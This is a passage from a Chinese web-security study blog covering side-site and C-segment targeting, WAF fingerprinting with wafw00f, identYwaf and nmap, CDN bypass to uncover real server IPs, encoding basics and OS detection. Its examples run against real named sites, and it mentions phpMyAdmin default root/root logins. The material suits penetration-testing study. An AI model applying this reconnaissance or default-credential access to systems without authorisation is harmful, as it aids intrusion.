size="4"><strong>5、搭建习惯-旁注,c段站点</strong></font></h4><p>旁注：同一个服务器上面存在多个站点、但是你要攻击的是A网站由于各种原因不能完成安全测试。就通过测试B网站进入服务器然后在攻击A网站最终实现目的。<br>C段：不同的服务器上面存在不同的网站，通过扫描发现与你渗透测试的是同一个网段最终拿下服务器、然后通过内网渗透的方式拿下渗透服务器。<br>在线工具：<a href="https://www.webscan.cc/">https://www.webscan.cc/</a><br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/8.png"><br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/9.png"><br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/10.png"><br>通过旁注查询可以发现同一个服务器上面有两个站点可以通过对另外的一个站点进行突破。</p><h4 id="6、搭建习惯-搭建软件特征站点"><a href="#6、搭建习惯-搭建软件特征站点" class="headerlink" title="6、搭建习惯-搭建软件特征站点"></a><font size="4"><strong>6、搭建习惯-搭建软件特征站点</strong></font></h4><p>有的网站是借助于第三方的集成搭建工具实现例如：PHPstudy、宝塔等环境这样的集成环境搭建的危害就是泄露了详细的版本信息。<br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/11.png"><br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/12.png"><br>phpstudy搭建了之后在默认的站点安装了phpmyadmin有的网站没有做安全性直接可以通过用户名：root密码：root 登录进入</p><h3 id="三、WAF防护分析"><a href="#三、WAF防护分析" class="headerlink" title="三、WAF防护分析"></a><font size="5"><strong>三、WAF防护分析</strong></font></h3><h4 id="1、什么是wAF应用"><a href="#1、什么是wAF应用" class="headerlink" title="1、什么是wAF应用?"></a><font size="4"><strong>1、什么是wAF应用?</strong></font></h4><p>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p><h4 id="2、如何快速识别WAF"><a href="#2、如何快速识别WAF" class="headerlink" title="2、如何快速识别WAF?"></a><font size="4"><strong>2、如何快速识别WAF?</strong></font></h4><p>1、采用工具wafwoof<br>获取地址：<a href="https://codeload.github.com/EnableSecurity/wafw00f/zip/refs/heads/master">https://codeload.github.com/EnableSecurity/wafw00f/zip/refs/heads/master</a><br>安装之前一定要有python的环境不然安装不上</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># unzip wafw00f-master.zip</span><span class="token comment" spellcheck="true"># python3.8 setup.py install</span><span class="token comment" spellcheck="true"># ls -ld wafw00f</span>drwxr-xr-x 6 root root 4096  6月 10 17:22 wafw00f<span class="token comment" spellcheck="true"># cd wafw00f </span><span class="token comment" spellcheck="true">#python main.py https://www.hlszsb.com/</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Checking https://www.hlszsb.com/<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Generic Detection results:<span class="token punctuation">[</span>-<span class="token punctuation">]</span> No WAF detected by the generic detection<span class="token punctuation">[</span>~<span class="token punctuation">]</span> Number of requests: 7</code></pre><p>wafw00f的缺点判断的不是特别的准确存在误报或识别不出的情况。</p><p>2、在有些网站的请求信息当中有的网站没有做安全信息上面留下了waf的相关信息<br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/13.png"></p><p>3、使用nmap指纹检测</p><pre class=" language-bash"><code class="language-bash">nmap --script<span class="token operator">==</span>http-waf-fingerprintnmap --script<span class="token operator">=</span>http-waf-detec</code></pre><p>4、identYwaf<br>参考地址：<a href="https://github.com/stamparm/identywaf">https://github.com/stamparm/identywaf</a></p><pre class=" language-bash"><code class="language-bash">C:\Users\admin\Desktop\security\软件\identYwaf-master<span class="token operator">></span>python identYwaf.py https://www.manjaro.cn/                                    __ __ ____  ___      ___  ____   ______ <span class="token operator">|</span>  T  T __    __   ____  _____l    j<span class="token operator">|</span>   \    /  _<span class="token punctuation">]</span><span class="token operator">|</span>    \ <span class="token operator">|</span>      T<span class="token operator">|</span>  <span class="token operator">|</span>  <span class="token operator">||</span>  T__T  T /    T<span class="token operator">|</span>   __<span class="token operator">|</span> <span class="token operator">|</span>  T <span class="token operator">|</span>    \  /  <span class="token punctuation">[</span>_ <span class="token operator">|</span>  _  Yl_j  l_j<span class="token operator">|</span>  ~  <span class="token operator">||</span>  <span class="token operator">|</span>  <span class="token operator">|</span>  <span class="token operator">|</span>Y  o  <span class="token operator">||</span>  l_ <span class="token operator">|</span>  <span class="token operator">|</span> <span class="token operator">|</span>  D  YY    _<span class="token punctuation">]</span><span class="token operator">|</span>  <span class="token operator">|</span>  <span class="token operator">|</span>  <span class="token operator">|</span>  <span class="token operator">|</span>  <span class="token operator">|</span>___  <span class="token operator">||</span>  <span class="token operator">|</span>  <span class="token operator">|</span>  <span class="token operator">||</span>     <span class="token operator">||</span>   _<span class="token operator">|</span> j  l <span class="token operator">|</span>     <span class="token operator">||</span>   <span class="token punctuation">[</span>_ <span class="token operator">|</span>  <span class="token operator">|</span>  <span class="token operator">|</span>  <span class="token operator">|</span>  <span class="token operator">|</span>  <span class="token operator">|</span>     <span class="token operator">!</span> \      / <span class="token operator">|</span>  <span class="token operator">|</span>  <span class="token operator">||</span>  <span class="token punctuation">]</span><span class="token operator">|</span>____jl_____jl_____jl__j__j  l__j  l____/   \_/\_/  l__j__jl__j  <span class="token punctuation">(</span>1.0.134<span class="token punctuation">)</span><span class="token punctuation">[</span>o<span class="token punctuation">]</span> initializing handlers<span class="token punctuation">..</span>.<span class="token punctuation">[</span>i<span class="token punctuation">]</span> checking <span class="token function">hostname</span> <span class="token string">'www.manjaro.cn'</span><span class="token punctuation">..</span>.<span class="token punctuation">[</span>i<span class="token punctuation">]</span> running basic heuristic test<span class="token punctuation">..</span>.<span class="token punctuation">[</span>i<span class="token punctuation">]</span> rejected summary: 200 <span class="token punctuation">(</span><span class="token string">'&lt;title>����ҳ��&lt;/title>'</span><span class="token punctuation">)</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span> non-blind match: -<span class="token punctuation">[</span>i<span class="token punctuation">]</span> running payload tests<span class="token punctuation">..</span>. <span class="token punctuation">(</span>45/45<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">=</span><span class="token punctuation">]</span> results: <span class="token string">'.xx.xxxxx..xxxxxxxx.xxx.x...x.xxx......x..xxx'</span><span class="token punctuation">[</span><span class="token operator">=</span><span class="token punctuation">]</span> hardness: hard <span class="token punctuation">(</span>60%<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">=</span><span class="token punctuation">]</span> blocked categories: SQLi, XSS, XPATHi, XXE, PHPi, PT<span class="token punctuation">[</span><span class="token operator">=</span><span class="token punctuation">]</span> signature: <span class="token string">'90fa:RVZXu261OEhCWapBYKcPk4JzWOpohM4JiUcMr2RXg1uQJbX3uhdOnthtOj+hX7AA16FcPhJOdLoXo2tKaK99n+i7c4RmkgI2FZjxtDtAeq+c3qA4chW1XaTD'</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> blind match: <span class="token string">'Safedog'</span> <span class="token punctuation">(</span>100%<span class="token punctuation">)</span></code></pre><p>与wafwoof相比运行速度慢，比较稳定推荐还是使用这一款工具。</p><h4 id="3、识别wAF对于安全测试的意义"><a href="#3、识别wAF对于安全测试的意义" class="headerlink" title="3、识别wAF对于安全测试的意义?"></a><font size="4"><strong>3、识别wAF对于安全测试的意义?</strong></font></h4><p>对于一个网站要是使用了waf而渗透人员没有识别直接使用工具进行扫描有可能会导致waf将你的ip地址拉入黑名单而不能访问。而识别waf在于有针对性行的绕过各个厂商的waf可能存在着不同的绕过思路。</p><h3 id="四、涉及资源："><a href="#四、涉及资源：" class="headerlink" title="四、涉及资源："></a><font size="5"><strong>四、涉及资源：</strong></font></h3><p><a href="https://www.shodan.io/">https://www.shodan.io/</a><br><a href="https://www.webscan.cc/">https://www.webscan.cc/</a><br><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-007</title>
      <link href="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/"/>
      <url>/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集-CDN绕过"><a href="#信息收集-CDN绕过" class="headerlink" title="信息收集-CDN绕过"></a><font size="6"><strong>信息收集-CDN绕过</strong></font></h2><span id="more"></span><h3 id="一、前言知识"><a href="#一、前言知识" class="headerlink" title="*一、前言知识"></a><font size="5">*<strong>一、前言知识</strong></font></h3><p>前言：CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在CDN服务，将会影响到后续的安全测试过程。</p><p><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/1.png"></p><h3 id="二、如何判断目标存在CDN服务"><a href="#二、如何判断目标存在CDN服务" class="headerlink" title="二、如何判断目标存在CDN服务?"></a><font size="5"><strong>二、如何判断目标存在CDN服务?</strong></font></h3><pre class=" language-bash"><code class="language-bash">利用多节点技术进行请求返回判断    http://ping.chinaz.com/     http://ping.aizhan.com/  http://ce.cloud.360.cn/</code></pre><p>如果ping的结果只有一个那么就没有CDN、要是不止一个则可以判断为有CDN<br>没有使用CDN</p><p><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/2.png"><br>使用CDN<br><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/3.png"></p><h3 id="三、CDN对于安全测试有那些影响"><a href="#三、CDN对于安全测试有那些影响" class="headerlink" title="三、CDN对于安全测试有那些影响?"></a><font size="5"><strong>三、CDN对于安全测试有那些影响?</strong></font></h3><pre class=" language-bash"><code class="language-bash">    cdn会隐藏服务器真实的ip地址，无法对目标网站的操作系统进行渗透，但cdn站点又可以理解为是目标站点的镜像站点（大多数都是静态cdn加速），拥有相同的网站架构，且cdn服务器可与站点服务器进行交互，因此sql注入，xss等漏洞的挖掘并不受太大影响。</code></pre><h3 id="四、目前常见的CDN绕过技术有哪些"><a href="#四、目前常见的CDN绕过技术有哪些" class="headerlink" title="四、目前常见的CDN绕过技术有哪些?"></a><font size="5"><strong>四、目前常见的CDN绕过技术有哪些?</strong></font></h3><pre class=" language-bash"><code class="language-bash">子域名查询：                    因为有些主站是做了CDN服务而子站是没有做CDN服务邮件服务查询                    因为邮箱大部分都是内部人在访问、而且访问的量也不是很大，一般是没有做CDN。国外地址请求                    因为很多的企业没有在国外部署CDN，要是用国外的地址请求、就容易找到他的真实地址。遗留文件、扫描全网                    如PHPinfo信息当中会遗留出ip地址黑暗引擎搜索                    fofa、傻蛋、谛听、zoomeye、censys特定文件dns历史记录，以量打量<span class="token comment" spellcheck="true">#CDN真实IP地址获取后绑定指向地址</span>更改本地HOSTS解析指向文件奇淫技巧    fackcdn w8fuckcdnzmap</code></pre><h3 id="五、案例演示获取真实ip"><a href="#五、案例演示获取真实ip" class="headerlink" title="五、案例演示获取真实ip"></a><font size="5"><strong>五、案例演示获取真实ip</strong></font></h3><h4 id="1、以学而思网站为例"><a href="#1、以学而思网站为例" class="headerlink" title="1、以学而思网站为例"></a><font size="4"><strong>1、以学而思网站为例</strong></font></h4><p><a href="http://www.xueersi.com/">www.xueersi.com</a></p><p><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/4.png"><br><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/5.png"></p><p>xuersi.com<br><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/6.png"><br><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/7.png"></p><p>备注：通过对比发现xueersi.com没有使用cdn直接获取到了真实的IP地址、而其中的IP地址71、72是负载均衡的访问入口。</p><p>验证获取到ip是否可信可以采用第三方的ip地址查询工具经行验证。<br><a href="https://get-site-ip.com/">https://get-site-ip.com/</a></p><p><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/8.png"></p><h4 id="2、www-sp910-com"><a href="#2、www-sp910-com" class="headerlink" title="2、www.sp910.com"></a><font size="4"><strong>2、<a href="http://www.sp910.com/">www.sp910.com</a></strong></font></h4><p><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/9.png"><br><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/10.png"><br><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/11.png"><br><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/12.png"><br><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/13.png"></p><h4 id="3、cdn网站"><a href="#3、cdn网站" class="headerlink" title="3、cdn网站"></a><font size="4"><strong>3、cdn网站</strong></font></h4><p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a><br><img src="/2023/09/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-007/14.png"></p><h3 id="六、涉及资源："><a href="#六、涉及资源：" class="headerlink" title="六、涉及资源："></a><font size="5"><strong>六、涉及资源：</strong></font></h3><p><a href="https://www.shodan.io/">https://www.shodan.io</a><br><a href="https://x.threatbook.cn/">https://x.threatbook.cn</a> 历史域名解析<br><a href="http://ping.chinaz.com/">http://ping.chinaz.com</a><br><a href="https://www.get-site-ip.com/">https://www.get-site-ip.com/</a> 查真实ip<br><a href="https://asm.ca.com/en/ping.php">https://asm.ca.com/en/ping.php</a> 海外ping<br><a href="https://github.com/Tai7sy/fuckcdn">https://github.com/Tai7sy/fuckcdn</a><br><a href="https://github.com/boy-hack/w8fuckcdn">https://github.com/boy-hack/w8fuckcdn</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzA5MzQ3MDE1NQ==&mid=2653939118&idx=1&sn=945b81344d9c89431a8c413ff633fc3a&chksm=8b86290abcf1a01cdc00711339884602b5bb474111d3aff2d465182702715087e22c852c158f&token=268417143&lang=zh_CN#rd">https://mp.weixin.qq.com/s?__biz=MzA5MzQ3MDE1NQ==&amp;mid=2653939118&amp;idx=1&amp;sn=945b81344d9c89431a8c413ff633fc3a&amp;chksm=8b86290abcf1a01cdc00711339884602b5bb474111d3aff2d465182702715087e22c852c158f&amp;token=268417143&amp;lang=zh_CN#rd</a> </p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-006</title>
      <link href="/2023/09/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-006/"/>
      <url>/2023/09/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-006/</url>
      
        <content type="html"><![CDATA[<h2 id="基础入门-加密编码算法"><a href="#基础入门-加密编码算法" class="headerlink" title="基础入门-加密编码算法"></a><font size="6"><strong>基础入门-加密编码算法</strong></font></h2><span id="more"></span><h3 id="一、前言知识"><a href="#一、前言知识" class="headerlink" title="一、前言知识"></a><font size="5"><strong>一、前言知识</strong></font></h3><p>前言:在渗透测试中，常见的密码等敏感信息会采用加密处理，其中作为安全测试人员必须要了解常见的加密方式，才能为后续的安全测试做好准备，本次课程将讲解各种加密编码等知识，便于后期的学习和发展。</p><h4 id="1、加密解密"><a href="#1、加密解密" class="headerlink" title="1、加密解密"></a><font size="4"><strong>1、加密解密</strong></font></h4><p>加密软件<br><img src="/2023/09/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-006/1.png"><br>解密软件<br><a href="https://www.cmd5.com/">https://www.cmd5.com/</a><br><img src="/2023/09/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-006/2.png"></p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#常见加密编码等算法解析</span>MD5，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES等<span class="token comment" spellcheck="true">#常见加密形式算法解析</span>直接加密，带salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等<span class="token comment" spellcheck="true">#常见解密方式（针对)</span>枚举，自定义逆向算法，可逆向<span class="token comment" spellcheck="true">#了解常规加密算法的特性</span>长度位数，字符规律，代码分析，搜索获取等</code></pre><h4 id="2、时间戳"><a href="#2、时间戳" class="headerlink" title="2、时间戳"></a><font size="4"><strong>2、时间戳</strong></font></h4><p>在线转换工具：<a href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a><br><img src="/2023/09/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-006/3.png"><br>时间戳通常是用在用户的注册、登录、注销等情况</p><h4 id="3、URL编码"><a href="#3、URL编码" class="headerlink" title="3、URL编码"></a><font size="4"><strong>3、URL编码</strong></font></h4><p><a href="https://www.cnblogs.com/cxygg/p/9278542.html">https://www.cnblogs.com/cxygg/p/9278542.html</a></p><table>    <thead>        <tr>            <th>序号</th>            <th>特殊字符</th>            <th>含义</th>            <th>十六进制值</th>        </tr>    </thead>    <tbody>        <tr>            <td>1</td>            <td>+</td>            <td>URL 中+号表示空格</td>            <td>%2B</td>        </tr>        <tr>            <td>2</td>            <td>空格</td>            <td>URL中的空格可以用+号或者编码</td>            <td>%20</td>        </tr>        <tr>            <td>3</td>            <td>/</td>            <td>分隔目录和子目录</td>            <td>%2F</td>        </tr>        <tr>            <td>4</td>            <td>?</td>            <td>分隔实际的 URL 和参数</td>            <td>%3F</td>        </tr>        <tr>            <td>5</td>            <td>%</td>            <td>指定特殊字符</td>            <td>%25</td>        </tr>        <tr>            <td>6</td>            <td>#</td>            <td>表示书签</td>            <td>%23</td>        </tr>        <tr>            <td>7</td>            <td>&</td>            <td>URL 中指定的参数间的分隔符</td>            <td>%26</td>        </tr>        <tr>            <td>8</td>            <td>=</td>            <td>URL 中+号表示空格</td>            <td>%3D</td>        </tr>    </tbody></table><h4 id="4、base64编码"><a href="#4、base64编码" class="headerlink" title="4、base64编码"></a><font size="4"><strong>4、base64编码</strong></font></h4><p><img src="/2023/09/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-006/4.png"><br><img src="/2023/09/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-006/5.png"><br>base64编码的特点：随着编码的文本增加而增加、由大小写和数字组成且字符结尾一般有两个等号<br>一般在代码中为了安全会使用base64进行编码</p><h4 id="5、unescape编码"><a href="#5、unescape编码" class="headerlink" title="5、unescape编码"></a><font size="4"><strong>5、unescape编码</strong></font></h4><p><img src="/2023/09/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-006/6.png"><br>和URL编码有点像<br>特点：一般是%U+四个数字对应着两个字符、主要运用于网站web应用</p><h4 id="4、AES加密"><a href="#4、AES加密" class="headerlink" title="4、AES加密"></a><font size="4"><strong>4、AES加密</strong></font></h4><p>aes在逐渐的取代md5值、在解密的过程中一定要知道密码和偏移量不然是借不出来的。<br>在线工具：<a href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a><br><img src="/2023/09/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-006/7.png"><br><img src="/2023/09/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-006/8.png"></p><h3 id="二、演示案例："><a href="#二、演示案例：" class="headerlink" title="二、演示案例："></a><font size="5"><strong>二、演示案例：</strong></font></h3><h4 id="✧-某CTF比赛题目解析"><a href="#✧-某CTF比赛题目解析" class="headerlink" title="✧ 某CTF比赛题目解析"></a><font size="4"><strong>✧ 某CTF比赛题目解析</strong></font></h4><p>脚本自定义算法组合逆向</p><h4 id="✧-某CMS密码加密解密"><a href="#✧-某CMS密码加密解密" class="headerlink" title="✧ 某CMS密码加密解密"></a><font size="4"><strong>✧ 某CMS密码加密解密</strong></font></h4><p>MD5+salt<br>部分CMS密码加密形式-wp,dz等</p><h4 id="✧-某URL加密地址的漏洞测试"><a href="#✧-某URL加密地址的漏洞测试" class="headerlink" title="✧ 某URL加密地址的漏洞测试"></a><font size="4"><strong>✧ 某URL加密地址的漏洞测试</strong></font></h4><p>AES+Base64+自定义<br>观察参数值加密字符串，下载源代码分析，函数定义AES加密，涉及模式CBC,128位，加密密码，偏移量，两次base64减去常规一次，填充模式。（_mozhe）</p><p>ZUlJOGMzSmVMMHQwZHhNN3diM056Zz09<br>eII8c3JeL0t0dxM7wb3Nzg&#x3D;&#x3D;</p><h4 id="✧-某实际应用URL地址参数加密"><a href="#✧-某实际应用URL地址参数加密" class="headerlink" title="✧ 某实际应用URL地址参数加密"></a><font size="4"><strong>✧ 某实际应用URL地址参数加密</strong></font></h4><p>#搜素特定关键字加密字符串</p><h3 id="三、涉及资源："><a href="#三、涉及资源：" class="headerlink" title="三、涉及资源："></a><font size="5"><strong>三、涉及资源：</strong></font></h3><p><a href="https://www.mozhe.cn/">https://www.mozhe.cn</a><br><a href="https://www.cmd5.com/">https://www.cmd5.com</a><br><a href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a><br><a href="https://ctf.bugku.com/challenges">https://ctf.bugku.com/challenges</a><br><a href="https://www.cr173.com/soft/21692.html">https://www.cr173.com/soft/21692.html</a><br><a href="https://gitee.com/ComsenzDiscuz/DiscuzX">https://gitee.com/ComsenzDiscuz/DiscuzX</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-005</title>
      <link href="/2023/09/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-005/"/>
      <url>/2023/09/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-005/</url>
      
        <content type="html"><![CDATA[<h2 id="基础入门-系统及数据库"><a href="#基础入门-系统及数据库" class="headerlink" title="基础入门-系统及数据库"></a><font size="6"><strong>基础入门-系统及数据库</strong></font></h2><span id="more"></span><p><img src="/2023/09/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-005/1.png"></p><h3 id="一、操作系统层面："><a href="#一、操作系统层面：" class="headerlink" title="一、操作系统层面："></a><font size="5"><strong>一、操作系统层面：</strong></font></h3><h4 id="1、识别操作系统常见方法"><a href="#1、识别操作系统常见方法" class="headerlink" title="1、识别操作系统常见方法"></a><font size="4"><strong>1、识别操作系统常见方法</strong></font></h4><p>a、有网站<br>可以通过网站识别通过网站的手工识别方法判断：<br>windows对大小写不敏感也就是说你在网页中可以替换网站路径的大小写进行测试</p><p>b、没有网站<br>通过nmap进行扫描方法：<br>nmap -O IP地址</p><pre class=" language-bash"><code class="language-bash">──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># nmap -O 10.1.1.10 </span>Starting Nmap 7.91 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2021-06-07 21:06 CSTNmap scan report <span class="token keyword">for</span> 10.1.1.10 <span class="token punctuation">(</span>10.1.1.10<span class="token punctuation">)</span>Host is up <span class="token punctuation">(</span>0.0011s latency<span class="token punctuation">)</span>.Not shown: 999 closed portsPORT   STATE SERVICE22/tcp <span class="token function">open</span>  <span class="token function">ssh</span>MAC Address: 00:0C:29:13:E9:61 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Device type: general purposeRunning: Linux 3.X<span class="token operator">|</span>4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hop</code></pre><p>备注：不是所有的系统都可以用这种方式扫描出操作系统的类型、在windows的一些高版本中无法探测，例如：</p><pre class=" language-bash"><code class="language-bash">─<span class="token comment" spellcheck="true"># nmap -O 10.1.1.129</span>Starting Nmap 7.91 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2021-06-07 21:10 CSTNmap scan report <span class="token keyword">for</span> 10.1.1.129 <span class="token punctuation">(</span>10.1.1.129<span class="token punctuation">)</span>Host is up <span class="token punctuation">(</span>0.00053s latency<span class="token punctuation">)</span>.Not shown: 994 closed portsPORT     STATE SERVICE80/tcp   <span class="token function">open</span>  httpMAC Address: 00:0C:29:DC:AF:EA <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>No exact OS matches <span class="token keyword">for</span> host <span class="token punctuation">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="token punctuation">)</span>.TCP/IP fingerprint:OS:SCAN<span class="token punctuation">(</span>V<span class="token operator">=</span>7.91%E<span class="token operator">=</span>4%D<span class="token operator">=</span>6/7%OT<span class="token operator">=</span>80%CT<span class="token operator">=</span>1%CU<span class="token operator">=</span>36041%PV<span class="token operator">=</span>Y%DS<span class="token operator">=</span>1%DC<span class="token operator">=</span>D%G<span class="token operator">=</span>Y%M<span class="token operator">=</span>000C29%TMOS:<span class="token operator">=</span>60BE1ADE%P<span class="token operator">=</span>x86_64-pc-linux-gnu<span class="token punctuation">)</span>SEQ<span class="token punctuation">(</span>SP<span class="token operator">=</span>106%GCD<span class="token operator">=</span>1%ISR<span class="token operator">=</span>10C%TI<span class="token operator">=</span>I%CI<span class="token operator">=</span>I%II<span class="token operator">=</span>I%OS:SS<span class="token operator">=</span>S%TS<span class="token operator">=</span>U<span class="token punctuation">)</span>OPS<span class="token punctuation">(</span>O1<span class="token operator">=</span>M5B4NW8NNS%O2<span class="token operator">=</span>M5B4NW8NNS%O3<span class="token operator">=</span>M5B4NW8%O4<span class="token operator">=</span>M5B4NW8NNS%O5<span class="token operator">=</span>M5OS:B4NW8NNS%O6<span class="token operator">=</span>M5B4NNS<span class="token punctuation">)</span>WIN<span class="token punctuation">(</span>W1<span class="token operator">=</span>FFFF%W2<span class="token operator">=</span>FFFF%W3<span class="token operator">=</span>FFFF%W4<span class="token operator">=</span>FFFF%W5<span class="token operator">=</span>FFFF%W6<span class="token operator">=</span>FF70<span class="token punctuation">)</span>OS:ECN<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>80%W<span class="token operator">=</span>FFFF%O<span class="token operator">=</span>M5B4NW8NNS%CC<span class="token operator">=</span>Y%Q<span class="token operator">=</span><span class="token punctuation">)</span>T1<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>80%S<span class="token operator">=</span>O%A<span class="token operator">=</span>S+%OS:F<span class="token operator">=</span>AS%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T2<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>80%W<span class="token operator">=</span>0%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>S%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T3<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>OS:80%W<span class="token operator">=</span>0%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>O%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T4<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>80%W<span class="token operator">=</span>0%S<span class="token operator">=</span>A%A<span class="token operator">=</span>O%F<span class="token operator">=</span>R%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%OS:Q<span class="token operator">=</span><span class="token punctuation">)</span>T5<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>80%W<span class="token operator">=</span>0%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T6<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>80%W<span class="token operator">=</span>0%S<span class="token operator">=</span>OS:A%A<span class="token operator">=</span>O%F<span class="token operator">=</span>R%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T7<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>80%W<span class="token operator">=</span>0%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>U1<span class="token punctuation">(</span>R<span class="token operator">=</span>OS:Y%DF<span class="token 